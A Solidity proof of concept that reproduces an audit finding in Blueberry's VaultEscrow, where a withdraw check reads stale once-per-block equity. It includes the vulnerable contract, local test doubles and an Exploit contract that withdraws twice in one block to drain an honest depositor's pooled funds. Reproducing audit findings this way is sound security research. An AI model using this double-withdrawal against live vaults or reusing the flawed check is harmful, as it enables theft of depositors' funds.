// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Blueberry finding 61455 (H-02):
// "Withdraw check can be bypassed" (Pashov Audit Group, 2025-03-12).
//
// Real audited source (the vulnerable WITHDRAW check + equity read are
// reproduced VERBATIM; the vulnerable line is marked @>):
//   protocol Blueberry  (HyperEVM VaultEscrow)
//   contract VaultEscrow
//   fn       withdraw(uint64 assets_)  +  _vaultEquity()
//   report   github.com/pashov/audits/blob/master/team/md/Blueberry-security-review_2025-03-12.md
//
// Root cause: withdraw() gates the amount with
//     require(assets_ <= _vaultEquity(), Errors.INSUFFICIENT_VAULT_EQUITY());   // @>
// and _vaultEquity() reads the vault's equity from the HyperCore precompile at
// VAULT_EQUITY_PRECOMPILE_ADDRESS (0x…0802). Per the HyperLiquid docs the
// precompile is synced ONCE, at EVM block construction — it is NOT updated per
// transaction within a block. So multiple withdrawals in the SAME block all read
// the same STALE equity and each passes the check. Their sum can exceed the real
// equity, letting a user withdraw more than they deposited and draining other
// depositors' pooled funds (and bricking their later withdrawals on L1).
//
// Faithful adaptation for deterministic (nonce-based, cheatcode-free) deploy:
// the real `address public constant VAULT_EQUITY_PRECOMPILE_ADDRESS = 0x…0802`
// is reproduced as an `immutable` set to a deployed precompile DOUBLE, so the
// staticcall resolves without cheatcodes. The vulnerable `require` line and the
// body of `_vaultEquity()` are byte-identical to the audited source; only the
// storage class of the precompile address changes (constant → immutable), which
// does not affect the bug. The precompile double models the once-per-block sync:
// its `equity` is written only at "block start" (syncEquity) and NEVER on
// withdraw, so it is stale within the block that run() represents.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev The HyperCore vault-equity precompile return type (uint64 fields).
struct UserVaultEquity {
    uint64 equity;
    uint64 lockedUntilTimestamp;
}

/// @dev Minimal double of the protocol Errors library (custom error verbatim).
library Errors {
    error INSUFFICIENT_VAULT_EQUITY();
}

/// @dev HyperCore L1 write precompile interface (subset the finding calls).
interface IL1Write {
    function sendVaultTransfer(address vault, bool isDeposit, uint64 usd) external;
    function sendUsdClassTransfer(uint64 ntl, bool toPerp) external;
    function sendSpot(address destination, uint64 token, uint64 amount) external;
}

interface IVaultEscrow {
    function withdraw(uint64 assets_) external;
    function vaultWrapper() external view returns (address);
}

/// @dev Faithful minimal ERC20 double for the spot asset (USDC, 6 decimals).
contract MockUSDC {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount; // checked: reverts if the reserve is drained
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Double of the HyperCore vault-equity precompile (real addr 0x…0802).
///      Models the once-per-EVM-block sync: `equity` is written ONLY at block
///      start (syncEquity), never on withdraw — hence stale within a block.
contract VaultEquityPrecompile {
    uint64 public equity;
    uint64 public lockedUntilTimestamp;

    /// @notice Block-start Core→EVM sync. Called at setup ("block construction"),
    ///         NEVER between the same-block withdrawals in run(). If it WERE
    ///         called per withdrawal the bug would not exist.
    function syncEquity(uint64 equity_) external {
        equity = equity_;
    }

    // The escrow reads via `ADDR.staticcall(abi.encode(address(this), _vault))`;
    // return the (stale) equity struct for any query.
    fallback(bytes calldata) external returns (bytes memory) {
        return abi.encode(UserVaultEquity(equity, lockedUntilTimestamp));
    }
}

/// @dev Double of the HyperCore L1 write precompile. sendVaultTransfer /
///      sendUsdClassTransfer schedule Core-side moves (no EVM-observable
///      effect here). sendSpot is the actual spot delivery: it pays `amount`
///      of the pooled spot asset to the withdrawing escrow's vaultWrapper.
contract L1Write is IL1Write {
    MockUSDC public token;

    constructor(MockUSDC t) {
        token = t;
    }

    function sendVaultTransfer(address, bool, uint64) external {}

    function sendUsdClassTransfer(uint64, bool) external {}

    function sendSpot(address, uint64, uint64 amount) external {
        // deliver the withdrawn spot to the party that initiated the withdrawal
        address to = IVaultEscrow(msg.sender).vaultWrapper();
        token.transfer(to, uint256(amount)); // paid from the pooled reserve
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — the withdraw() check and _vaultEquity() read are
// reproduced VERBATIM from the audited VaultEscrow source.
// ─────────────────────────────────────────────────────────────────────────────
contract VaultEscrow is IVaultEscrow {
    // Real source: `address public constant VAULT_EQUITY_PRECOMPILE_ADDRESS =
    //               0x0000000000000000000000000000000000000802;`
    // Reproduced as an immutable pointing at the deployed precompile double so
    // the verbatim staticcall in _vaultEquity() resolves without cheatcodes.
    address public immutable VAULT_EQUITY_PRECOMPILE_ADDRESS;

    IL1Write internal L1_WRITE_PRECOMPILE;
    address internal HYPERLIQUID_SPOT_BRIDGE;

    address public vaultWrapper;
    address internal _vault;
    uint64 internal _assetIndex;
    uint8 internal _perpDecimals;
    uint8 internal _evmSpotDecimals;

    modifier onlyVaultWrapper() {
        require(msg.sender == vaultWrapper, "only vault wrapper");
        _;
    }

    constructor(
        address precompile_,
        IL1Write l1_,
        address vault_,
        uint64 assetIndex_,
        uint8 perpDecimals_,
        uint8 evmSpotDecimals_,
        address spotBridge_,
        address vaultWrapper_
    ) {
        VAULT_EQUITY_PRECOMPILE_ADDRESS = precompile_;
        L1_WRITE_PRECOMPILE = l1_;
        _vault = vault_;
        _assetIndex = assetIndex_;
        _perpDecimals = perpDecimals_;
        _evmSpotDecimals = evmSpotDecimals_;
        HYPERLIQUID_SPOT_BRIDGE = spotBridge_;
        vaultWrapper = vaultWrapper_;
    }

    // ── VERBATIM audited source ──────────────────────────────────────────────
    function withdraw(uint64 assets_) external override onlyVaultWrapper {
        require(assets_ <= _vaultEquity(), Errors.INSUFFICIENT_VAULT_EQUITY()); // @> VULN: equity is read from the stale once-per-block precompile, so every same-block withdrawal passes this check and the total can exceed the real equity
        uint256 amountPerp = (_perpDecimals > _evmSpotDecimals)
            ? assets_ * (10 ** (_perpDecimals - _evmSpotDecimals))
            : assets_ / (10 ** (_evmSpotDecimals - _perpDecimals));

        L1_WRITE_PRECOMPILE.sendVaultTransfer(_vault, false, uint64(amountPerp));
        L1_WRITE_PRECOMPILE.sendUsdClassTransfer(uint64(amountPerp), false);
        L1_WRITE_PRECOMPILE.sendSpot(HYPERLIQUID_SPOT_BRIDGE, _assetIndex, assets_);
    }

    function _vaultEquity() internal view returns (uint256) {
        (bool success, bytes memory result) =
            VAULT_EQUITY_PRECOMPILE_ADDRESS.staticcall(abi.encode(address(this), _vault));
        require(success, "VaultEquity precompile call failed");

        UserVaultEquity memory userVaultEquity = abi.decode(result, (UserVaultEquity));

        uint256 equityInSpot = (_perpDecimals > _evmSpotDecimals)
            ? userVaultEquity.equity / (10 ** (_perpDecimals - _evmSpotDecimals))
            : userVaultEquity.equity * (10 ** (_evmSpotDecimals - _perpDecimals));

        return equityInSpot;
    }
    // ── end VERBATIM ───────────────────────────────────────────────────────────
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: within one EVM block, withdraw the (stale) equity TWICE from
// the same escrow. Both pass the bypassable check, so the attacker extracts 2x
// their real equity — draining an honest depositor's pooled funds and leaving
// that depositor unable to withdraw.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MockUSDC public usdc;
    VaultEquityPrecompile public precompile;
    L1Write public l1;
    VaultEscrow public escrow; // VULN
    VaultEscrow public bobEscrow; // honest depositor's escrow (same shared reserve)

    uint64 internal constant EQUITY = 1_000e6; // attacker's real vault equity (1000 USDC)
    uint64 internal constant HONEST_DEPOSIT = 1_000e6; // honest depositor's pooled funds
    uint64 internal constant ASSET_INDEX = 0;
    uint8 internal constant DEC = 6; // perp == evm-spot decimals (identity scaling)
    address internal constant VAULT = address(uint160(0xA17F)); // placeholder core vault addr

    uint256 public received; // total the attacker walked away with
    uint256 public stolen; // extracted beyond the attacker's real equity
    uint256 public reserveAfter; // pooled reserve left for honest depositors
    bool public honestWithdrawReverted;

    constructor() {
        usdc = new MockUSDC(); // child nonce 1  (profit token)
        precompile = new VaultEquityPrecompile(); // child nonce 2
        l1 = new L1Write(usdc); // child nonce 3
        escrow = new VaultEscrow( // child nonce 4  (VULN)
            address(precompile), l1, VAULT, ASSET_INDEX, DEC, DEC, address(l1), address(this)
        );
        bobEscrow = new VaultEscrow( // child nonce 5
            address(precompile), l1, VAULT, ASSET_INDEX, DEC, DEC, address(l1), address(this)
        );

        // "prior blocks": attacker deposited EQUITY and an honest depositor
        // deposited HONEST_DEPOSIT; all bridged spot funds pool in the reserve.
        usdc.mint(address(l1), uint256(EQUITY) + uint256(HONEST_DEPOSIT)); // 2000 USDC

        // "block-start sync": HyperCore syncs the escrow's equity to the precompile.
        // It is NOT resynced between the same-block withdrawals in run().
        precompile.syncEquity(EQUITY);
    }

    function run() external {
        uint256 before = usdc.balanceOf(address(this)); // 0

        // ── single EVM block ──────────────────────────────────────────────────
        // withdrawal #1: assets_(1000) <= equity(1000) passes; 1000 USDC paid out.
        escrow.withdraw(EQUITY);
        // withdrawal #2 (same block): the precompile equity is STALE (still 1000,
        // not reduced by withdrawal #1), so the check passes AGAIN; another 1000
        // USDC is paid out — double what the attacker actually has.
        escrow.withdraw(EQUITY);

        received = usdc.balanceOf(address(this)) - before; // 2000 USDC
        stolen = received - uint256(EQUITY); // 1000 USDC beyond real equity
        reserveAfter = usdc.balanceOf(address(l1)); // 0 — pool drained

        // The honest depositor's later withdrawal now bricks: the check still
        // passes on stale equity, but the pooled reserve is empty so the spot
        // delivery reverts (matches the finding's "Bob's transaction reverts").
        try bobEscrow.withdraw(HONEST_DEPOSIT) {
            honestWithdrawReverted = false;
        } catch {
            honestWithdrawReverted = true;
        }

        // HARM: same-block double-withdrawal bypassed the equity check and paid
        // out 2x the attacker's real equity, draining the honest depositor's
        // pooled funds and freezing their withdrawal.
        require(received == 2 * uint256(EQUITY), "double withdrawal did not go through");
        require(received > uint256(EQUITY), "did not exceed real equity");
        require(stolen == uint256(HONEST_DEPOSIT), "theft magnitude mismatch");
        require(reserveAfter == 0, "reserve not drained");
        require(honestWithdrawReverted, "honest depositor should be unable to withdraw");
    }
}
